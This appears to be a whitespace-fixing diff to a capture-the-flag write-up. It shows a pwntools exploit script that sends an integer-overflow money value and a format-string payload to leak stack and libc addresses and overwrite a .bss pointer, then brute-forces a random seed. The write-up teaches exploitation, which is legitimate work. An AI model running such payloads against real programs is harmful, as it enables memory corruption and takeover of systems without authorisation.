@@ -149,8 +149,7 @@ def main():
     io.recvuntil("How much money you want?")
     # We want the biggest amount of money possible!
     io.sendline(str(0x8000000000000000-1)) 
-
-	io.recvuntil("Player name:")
+    io.recvuntil("Player name:")
     
     # Leak stack and libc addresses and overwrite `.bss` pointer, will explain in detail later!
     io.sendline("%88c%13$hhn|%10$p|%29$p")
@@ -167,9 +166,9 @@ def main():
     # The libc pointer we leaked is a return pointer to `__libc_start_main` in offset 240
     libc_base = leak_libc - (libc.symbols['__libc_start_main']+240)
     io.recvuntil("Your money: ")
-	  data = io.recv().split(b" ZWD")[0]
-	  # Get buffer address to make sure we got it.
-	  addr = int(data, 10)
+    data = io.recv().split(b" ZWD")[0]
+    # Get buffer address to make sure we got it.
+    addr = int(data, 10)
 ```
 
 So far all we did was overwrite the money address (`.bss` address) with the feedback's `.bss` address and leaked a valid stack pointer that will point to a return address when feedback is received and leaked a libc pointer and calculated it's base.
@@ -209,8 +208,8 @@ def main():
         # Update the address so we can use it later
         addr = int(data, 10)
         
-  # Try all possible 3 byte combinations for seed
-  real_seed = -1
+    # Try all possible 3 byte combinations for seed
+    real_seed = -1
 	for seed in range(0xffffff):
         count = 0
         libc_so.srand(seed)
